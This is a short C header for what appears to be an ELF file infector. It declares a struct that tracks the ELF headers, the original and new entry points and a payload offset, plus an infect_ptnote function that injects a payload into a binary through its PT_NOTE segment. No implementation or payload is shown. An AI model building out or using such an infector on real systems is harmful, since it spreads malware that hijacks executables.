#ifndef INFECTION_H
#define INFECTION_H

#include <stdint.h>
#include <stddef.h>
#include <elf.h>
#include <sys/stat.h>

typedef struct s_infection {
    int fd;
    char *map;
    struct stat *st;
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Addr original_entry;
    Elf64_Addr new_entry;
    int ptnote_index;
    off_t payload_offset;
} t_infection;

t_infection *init_infection(void);
void free_infection(t_infection *inf);
int infect_ptnote(const char *file, unsigned char payload[], size_t payload_size);

#endif
